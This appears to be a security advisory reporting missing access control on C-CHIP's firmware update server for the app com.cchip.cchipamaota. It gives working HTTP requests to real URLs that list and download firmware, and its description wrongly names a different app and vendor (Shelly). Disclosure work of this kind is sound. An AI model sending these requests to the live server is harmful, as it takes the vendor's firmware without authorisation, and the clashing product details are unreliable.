# Vulnerability Report - com.cchip.cchipamaota- Incorrect Access Control

**Product:** `com.cchip.cchipamaota` 

**Vendor:** [C-CHIP](http://www.c-chip.com.cn/english/)

**Version:** 1.2.8

**Vulnerability Type:** Incorrect Access Control

**Severity:** High

## Description

The `com.home.shelly` , developed by Shelly, suffers from an Incorrect Access Control vulnerability during the device firmware update process. The app uses HTTPS requests to download firmware updates. By reverse engineering the app, it was possible to identify the firmware download mechanism and the download link. Dynamic testing revealed that the vendor's firmware server lacks proper access control, leading to **firmware leakage**.

> Although the vendor has discontinued the use of the application, the URL for obtaining firmware has not been deprecated.

## Reproduction Steps

1. The `URL_GET_3266` String value in the `Constants` class provides the necessary URL and other information required for the HTTP request. Static reverse engineering allows for the reconstruction of the complete request as follows:

   ![image-20241002231411105](https://s2.loli.net/2024/10/02/ImyZbFrVCtNgTKh.png)

2. Sending this URL request to the firmware server results in a direct response containing the latest firmware information as follows:

   > Request

   ```http
   GET https://otaus.ccsmart.com.cn:8443/CCHIP_AMA_OTA/update.json HTTP/1.1
   Host: otaus.ccsmart.com.cn:8443
   Content-Type: text/plain
   ```

   > Response:

   ```http
   HTTP/1.1 200
   Accept-Ranges: bytes
   ETag: W/"4657-1602659827000"
   Last-Modified: Wed, 14 Oct 2020 07:17:07 GMT
   Content-Type: application/json
   Content-Length: 4657
   Date: Wed, 02 Oct 2024 15:03:18 GMT
   
   {
       "updates": [
         {
           "device": "XZX",
           "build": "1362456405",
           "version": "1003",
           "file": [
               "/XZX/XZX_V1003_H1.bin",
               "/XZX/XZX_V1003_H2.bin"
           ],
           "description":"for test",
           "md5":"1506e35363c5f59cb7cde3ea0af83859"
         },
        {
           "device": "GGMMW1A",
           "build": "1562829949",
           "version": "1004",
           "file": [
               "/GGMMW1A/GGMMW1A_V1004_H1.bin",
               "/GGMMW1A/GGMMW1A_V1004_H2.bin"
           ],
           "filesize": [
               "1040384",
               "1040384"
           ],
           "description": "Modified SPP display name",
           "md5": "1506e35363c5f59cb7cde3ea0af83859"
        },
        ......
   ```

   Then, contact the `file` with `https://otaus.ccsmart.com.cn:8443/CCHIP_AMA_OTA/`, we can access the firmware directly.

   ```HTTP
   GET https://otaus.ccsmart.com.cn:8443/CCHIP_AMA_OTA//GGMMW1A/GGMMW1A_V1004_H1.bin HTTP/1.1
   Host: otaus.ccsmart.com.cn:8443
   Content-Type: text/plain
   ```

3. Consequently, the unprotected firmware can be directly downloaded using this information.

   ![image-20241002231350187](https://s2.loli.net/2024/10/02/LpJTuyxVoQjEBYO.png)


## Impact

An attacker can exploit this vulnerability to:

* Download the latest firmware before it is officially released.
* Analyze the firmware for vulnerabilities or proprietary information.
* Create modified firmware images with malicious code.
* Distribute compromised firmware updates to unsuspecting users.

## Remediation

* Implement proper access control on the firmware server, such as device ID and user ID verification.
* Enhance the app's firmware update mechanism to include authentication credentials in the requests.


## Disclaimer

This vulnerability report is provided for informational purposes only and should not be used for any malicious activities. The author is not responsible for any misuse of the information contained herein.